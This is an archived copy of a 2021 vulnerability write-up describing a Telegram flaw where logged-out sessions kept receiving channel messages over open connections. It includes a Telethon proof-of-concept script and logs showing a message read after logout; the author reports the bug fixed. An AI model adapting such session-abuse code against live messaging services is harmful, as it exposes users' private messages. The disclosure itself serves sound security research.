---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-09-24_telegram-bug-in-terminated-sessions.md
original_filename: 2021-09-24_telegram-bug-in-terminated-sessions.md
title: Telegram bug in terminated sessions
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: 6bd2f0703a3c1f3e86f995eb339e60a345e2d089c18432bc6f8864fdb5e84ab1
text_sha256: 64a51df2887b74e5caee363699f2ae05e38158f7c08656ec6ea7e01b24d83116
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# Telegram bug in terminated sessions

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-09-24_telegram-bug-in-terminated-sessions.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `6bd2f0703a3c1f3e86f995eb339e60a345e2d089c18432bc6f8864fdb5e84ab1`
- Text SHA256: `64a51df2887b74e5caee363699f2ae05e38158f7c08656ec6ea7e01b24d83116`


## Content

---
title: "Telegram bug in terminated sessions"
page_title: "Telegram bug in terminated sessions | Penn’s Page"
url: "https://hack5.dev/telegram/bug/2021/09/24/telegram-sessions-bug.html"
final_url: "https://hack5.dev/telegram/bug/2021/09/24/telegram-sessions-bug.html"
authors: ["Hackintosh5"]
programs: ["Telegram"]
bugs: ["Session expiration issue"]
publication_date: "2021-09-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3285
---

# Telegram bug in terminated sessions

Sep 24, 2021 

> [Do you think that Telegram servers are coded by monkeys?](https://t.me/tgbetachat/673556)

## TL;DR

A terminated session or a deleted account was still able to receive messages from active connections. Telegram fixed it as of 15~16 September 2021.

## Introduction

The Telegram MTProto protocol is tricky, like its backend. Sometimes Telegram developers forget to implement some critical security controls when adding new features, in this case kicking out existing sessions. The same thing has happened before (or after) with missing rate-limiting in chat imports, although it was fixed very quickly after release.

## The vulnerability

As the ability to invalidate logged in sessions or to kick out users from the application after their account got deleted are very old features, we can assume this vulnerability has been there for a long time.

But what is it about? Well, as you can read in the TL;DR, after a session is invalidated, if the connection has not been closed yet, Telegram will continue sending channels messages updates. Note that official clients always do close the connection, so the behaviour wasn’t obvious - everything appeared to work fine if you used an official client to test.

Note that `channel` can mean a broadcast channel, a supergroup, a gigagroup or a local group, as they are all the same at API level. Therefore, you would not receive updates from private chats, bots, basic groups, or most importantly, the Telegram service account which sends login codes.

## POC

When a session gets kicked out, Telegram sends an [updatesTooLong](https://core.telegram.org/constructor/updatesTooLong) constructor, which tells clients that they are supposed to call [updates.getDifference](https://core.telegram.org/method/updates.getDifference), which will then give a `401 AUTH_KEY_UNREGISTERED` RPC error, prompting the client to close the TCP connection.

However, if it is ignored by the client, and no more TL functions are called, Telegram will just continue sending you channel updates until connection is closed.

To exploit this, I used the [Telethon library](https://telethon.dev). First, the script connected to the Telegram testmode environment and created an account for itself. Next, it immediately logged out of this account, meaning that it should be unable to read any new messages. Finally, it waited for incoming updates from Telegram (bypassing the built-in Telethon code, which made some extra RPC requests, breaking the code) and printed them.

The proof of concept code is very small (note that it no longer works, as the issue is resolved):
  
  
  import asyncio
  import telethon
  from telethon.sync import TelegramClient
  from telethon.tl.functions.auth import LogOutRequest
  from telethon.tl.functions.updates import GetStateRequest
  
  
  client = TelegramClient(None, 12345, "0123456789abcdef0123456789abcdef")
  client.session.set_dc(2, '149.154.167.40', 80)
  client.start(phone='9996621234', code_callback=lambda:'22222')
  
  @client.on(telethon.events.NewMessage())
  async def raw(e):
  print(e.text)
  
  with client:
  client.start()
  print(client(GetStateRequest()))
  print(client(LogOutRequest()))
  asyncio.get_event_loop().run_until_complete(asyncio.wait_for(client.disconnected, None))
  

Here is an extract of the logs of what happened:
  
  
  DEBUG:telethon.network.mtprotosender:Handling update UpdatesTooLong
  DEBUG:telethon.network.mtprotosender:Receiving items from the network...
  UpdatesTooLong()
  DEBUG:telethon.extensions.messagepacker:Assigned msg_id = 7003973880031307500 to PingRequest (7fea21e29fa0)
  DEBUG:telethon.network.mtprotosender:Encrypting 1 message(s) in 28 bytes for sending
  DEBUG:telethon.network.mtprotosender:Encrypted messages put in a queue to be sent
  DEBUG:telethon.network.mtprotosender:Waiting for messages to send...
  DEBUG:telethon.extensions.messagepacker:Assigned msg_id = 7003973880037489216 to MsgsAck (7fea21e29e80)
  DEBUG:telethon.network.mtprotosender:Encrypting 1 message(s) in 60 bytes for sending
  DEBUG:telethon.network.mtprotosender:Encrypted messages put in a queue to be sent
  DEBUG:telethon.network.mtprotosender:Waiting for messages to send...
  DEBUG:telethon.network.mtprotosender:Handling container
  DEBUG:telethon.network.mtprotosender:Handling pong for message 7003973880031307500
  DEBUG:telethon.network.mtprotosender:Handling update UpdateShort
  DEBUG:telethon.network.mtprotosender:Handling update Updates
  DEBUG:telethon.network.mtprotosender:Handling update Updates
  DEBUG:telethon.network.mtprotosender:Receiving items from the network...
  UpdateChannelUserTyping(channel_id=10812878, from_id=PeerUser(user_id=925104), action=SendMessageTypingAction(), top_msg_id=None)
  UpdateNewChannelMessage(message=Message(id=2, peer_id=PeerChannel(channel_id=10812878), date=datetime.datetime(2021, 9, 4, 7, 15, 33, tzinfo=datetime.timezone.utc), message='here is a sensitive message', out=False, mentioned=False, media_unread=False, silent=False, post=False, from_scheduled=False, legacy=False, edit_hide=False, pinned=False, from_id=PeerUser(user_id=925104), fwd_from=None, via_bot_id=None, reply_to=None, media=None, reply_markup=None, entities=[], views=None, forwards=None, replies=MessageReplies(replies=0, replies_pts=3, comments=False, recent_repliers=[], channel_id=None, max_id=None, read_max_id=None), edit_date=None, post_author=None, grouped_id=None, restriction_reason=[], ttl_period=None), pts=3, pts_count=1)
  

## Conclusion

The flaw was reported to Telegram on 2021/09/04, and the bug was fixed by 2021/09/15.

I was offered a bounty but didn’t accept it because it came with an NDA, which would’ve forced me to abide by a series of rules that would’ve severely limited my freedom to disclose future vulnerabilities (whether responsibly or not) as well as trap me in an unnecessary, not to mention purposefully ambiguous, legal rat’s nest that could have been easily exploited to silence me in the future. I understand that Telegram needs to protect themselves from irresponsible security experts that disclose vulnerabilities in ways that dishonor the field, but forcing this kind of restriction onto people who spend their own time trying to find problems into their infrastructure and who attempt to proactively help fix them is an oxymoron, especially given that the economical compensation for such precious time, which Telegram never fails to boast, is locked behind the wall of signing this NDA. This sounds like a way of telling people “Thanks for reporting this! Now take this money, sign this paper here and shut up or we’ll sue you if you ever say a word about it”, which is counterintuitive given Telegram’s CEO Pavel Durov has always been very open about his despise for oppressive governments and organizations.

## Credits

  * Me for realising the bug and the PoC
  * [@ShalmonAnandMate](https://t.me/telethonofftopic/744766) for reminding me of the issue
  * [@DavideGalilei](https://t.me/DavideGalilei) and [@nocturn9x](https://t.me/nocturn9x) for helping with this write-up

[](/telegram/bug/2021/09/24/telegram-sessions-bug.html)
